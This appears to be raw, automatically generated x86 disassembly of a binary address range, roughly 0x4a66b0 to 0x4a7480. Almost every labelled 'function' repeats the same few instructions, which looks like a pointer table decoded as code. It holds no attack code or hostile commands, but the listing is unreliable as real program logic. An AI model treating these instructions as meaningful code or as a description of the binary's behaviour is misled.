sub_4a66b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a66f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6700
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6708
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6710
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6718
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6720
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6728
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6730
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6738
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6740
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6748
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6750
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6758
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6760
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6768
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6770
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6778
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6780
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6788
cmp dl cl
dec edx
add [ eax + 0x380040b3 ] ch
0x4a
sub_4a6794
shl [ ebx - 0x35c7ffc0 ] 0x4a
add [ eax ] bh
0x4a
sub_4a67a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a67f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6800
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6808
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6810
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6818
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6820
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6828
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6830
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6838
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6840
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6848
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6850
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6858
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6860
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6868
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6870
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6878
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6880
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6888
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6890
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6898
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68b0
or [ edi - 0x35c7ffc0 ] dh
dec edx
add [ eax ] bh
0x4a
sub_4a68bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a68fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6904
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a690c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6914
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a691c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6924
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a692c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6934
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a693c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6944
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a694c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6954
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a695c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6964
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a696c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6974
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a697c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6984
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a698c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6994
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a699c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a69fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6a9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6aa4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6aac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ab4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6abc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ac4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6acc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ad4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6adc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ae4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6aec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6af4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6afc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6b8c
cmp dl cl
dec edx
add [ eax + 0x380040b7 ] dl
0x4a
sub_4a6b98
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ba0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ba8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6bb0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6bb8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6bc0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6bc8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6bd0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6bd8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6be0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6be8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6bf0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6bf8
les edi [ eax - 0x35c7ffc0 ]
dec edx
add [ eax ] bh
0x4a
sub_4a6c04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6c9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ca4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cb4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cbc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cc4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ccc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cd4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cdc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ce4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cf4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6cfc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6d9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6da4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6dac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6db4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6dbc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6dc4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6dcc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6dd4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ddc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6de4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6dec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6df4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6dfc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e0c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6e9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ea4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6eac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6eb4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ebc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ec4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ecc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ed4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6edc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ee4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6eec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ef4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6efc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f04
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f14
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f1c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f24
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f2c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f34
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f3c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f44
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f4c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f54
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f5c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f64
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f6c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f74
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f7c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f84
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f8c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f94
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6f9c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6fa4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6fac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6fb4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6fbc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6fc4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6fcc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6fd4
cmp dl cl
dec edx
add al bh
mov eax 0xca380040
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4a6fe8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ff0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a6ff8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7000
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7008
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7010
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7018
cmp dl cl
dec edx
add [ eax - 0x47ffbf58 ] al
test al 0x40
add ah cl
test al 0x40
add [ eax ] bh
0x4a
sub_4a702c
push esp
test eax 0xca380040
dec edx
add [ ecx + ebp * 4 - 0x35c7ffc0 ] cl
dec edx
add [ eax ] bh
0x4a
sub_4a707c
cmp dl cl
dec edx
add [ ecx + edx + 0x40 ] dl
add [ ecx + edx + 0x40 ] ah
add [ eax + 0x11 ] bh
inc eax
add [ eax ] bh
0x4a
sub_4a70c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a70fc
add [ eax + eax * 2 ] bl
add [ eax ] bh
0x4a
sub_4a7104
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a710c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7114
and al 0x1c
inc eax
add [ eax ] bh
0x4a
sub_4a711c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7124
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a712c
aam 0x1d
inc eax
add [ eax ] bh
0x4a
sub_4a7134
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a713c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7144
cmp dl cl
dec edx
add [ esi + ebx ] ch
inc eax
add [ eax ] bh
0x4a
sub_4a7150
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7158
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7160
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7168
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7170
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7178
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7180
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7188
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7190
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7198
inc esp
push ds
inc eax
add [ eax ] bh
0x4a
sub_4a71a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a71f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7200
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7208
pop eax
push ds
inc eax
add [ eax ] bh
0x4a
sub_4a7210
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7218
insb
push ds
inc eax
add [ esi + ebx - 0x35c7ffc0 ] bh
dec edx
add [ eax ] bh
0x4a
sub_4a7228
cmp dl cl
dec edx
add al ch
push ds
inc eax
add [ eax ] al
pop ds
inc eax
add [ eax ] bh
0x4a
sub_4a7238
xchg esp eax
pop ds
inc eax
add [ eax ] bh
0x4a
sub_4a7240
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7248
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7250
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7258
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7260
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7268
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7270
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7278
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7280
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7288
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7290
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7298
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72a0
cmp dl cl
dec edx
add al dh
and [ eax ] eax
adc al 0x22
inc eax
add [ edx ] ch
inc eax
add [ eax + 0x22 ] cl
inc eax
add [ eax ] bh
0x4a
sub_4a72b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a72f8
les esp [ edx ]
inc eax
add ah bl
and al [ eax ]
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7308
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7310
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7319
and eax [ eax ]
lodsb [ esi ]
and eax [ eax ]
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7328
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7330
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7338
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7340
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7348
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7350
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7358
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + edx * 8 + 0x40 ] cl
add [ eax ] bh
0x4a
sub_4a736c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7374
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a737c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7384
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a738e
inc eax
add [ esi + edx * 8 - 0x35c7ffc0 ] cl
dec edx
add [ eax ] bh
0x4a
sub_4a739c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a73a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a73ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a73b4
xor al 0xd7
inc eax
add [ eax - 0x29 ] dl
inc eax
add al ah
fadd [ eax ]
mov dh bl
inc eax
add [ edi + ebx * 8 ] bh
inc eax
add [ eax ] bh
0x4a
sub_4a73cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a73d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a73dc
cmp dl cl
dec edx
add al ah
fild [ eax ]
int3
sub_4a7444
pop esp
out dx al
inc eax
add ah bh
out dx al
inc eax
add [ edi + ebp * 8 - 0x35c7ffc0 ] bl
dec edx
add [ eax ] bh
0x4a
sub_4a7458
cmp dl cl
dec edx
add [ eax + esi * 8 + 0x40 ] dl
add [ eax ] bh
0x4a
sub_4a7466
inc eax
add [ eax + 0x300040f1 ] dl
inc eax
add al ah
inc eax
add [ eax ] bh
0x4a
sub_4a7478
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4a7480
